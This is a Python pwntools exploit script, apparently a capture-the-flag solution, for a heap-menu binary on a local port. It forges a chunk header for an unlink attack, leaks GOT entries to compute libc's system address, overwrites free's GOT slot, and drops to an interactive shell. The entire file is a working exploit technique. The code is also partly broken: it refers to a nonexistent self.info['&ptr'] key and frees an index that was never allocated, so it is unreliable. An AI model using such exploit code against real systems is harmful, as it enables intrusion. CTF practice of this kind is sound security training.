#! /usr/bin/python
#coding:utf-8

from pwn import *

info = {
    'libc_free':0x00076070,
    'libc_sys':0x0003e360,
    'ptr':0x0804bfa0,
    'got':0x0804a004
    }

ip, port = '127.0.0.1', 11111
# io = zio((ip, port))
p = remote(ip, port)


p.recvline() # choice
p.sendline('m')
p.recvline() # malloc
p.recvline() # size
p.sendline('504')
p.recvline() # content
p.sendline('aaa')
p.recvline() # ok

print 'm 0\n'

p.recvline() # choice
p.sendline('m')
p.recvline() # malloc
p.recvline() # size
p.sendline('504')
p.recvline() # content
p.sendline('aaa')
p.recvline() # ok

print 'm 1\n'

p.recvline() # choice
p.sendline('m')
p.recvline() # malloc
p.recvline() # size
p.sendline('20')
p.recvline() # content
p.sendline('/bin/sh')
p.recvline() # ok

print 'm 2\n'

#关键payload
p.recvline() # choice
p.sendline('e')
p.recvline() # edit
p.sendline('0')
p.sendline(p32(0x0)  + p32(0x1f9) + p32(self.info['&ptr'] - 0xc) + p32(self.info['&ptr'] - 0x8) + 'a'*(504 - 16) + p32(0x200-8) + p32(0x200))
p.recvline() # ok

print 'e 0\n'

p.recvline() # choice
p.sendline('f')
p.recvline() # free
p.sendline('1')
p.recvline() # ok

print 'f 1\n'



p.recvline() # choice
p.sendline('e')
p.recvline() # edit
p.sendline('0')
p.sendline('a'*12 + p32(info['got']))
p.recvline() # ok

print 'e 0 got'

# leak GOT
p.recvline() # choice
p.sendline('p')
p.recvline() # print
p.sendline('0')

gets = u32(p.recv(4))
free_addr = u32(p.recv(4))
getchar = u32(p.recv(4))
malloc = u32(p.recv(4))
puts = u32(p.recv(4))
gmon_start__  = u32(p.recv(4))
libc_start_main = u32(p.recv(4))
isoc99_scanf = u32(p.recv(4))




sys_addr = free_addr - info['libc_free'] + info['libc_sys']
print 'free_addr = ' + hex(free_addr)
print 'system_addr = ' + hex(sys_addr)

p.recvline() # choice
p.sendline('e')
p.recvline() # edit
p.sendline('0')


p.sendline(p32(gets) + p32(sys_addr) + p32(getchar) + p32(malloc) + p32(puts) + p32(gmon_start__) + p32(libc_start_main) + p32(isoc99_scanf))
p.recvline() # ok

p.recvline() # choice
p.sendline('f')
p.recvline() # free
p.sendline('3')

p.recvline()
p.recvline()


p.interactive()




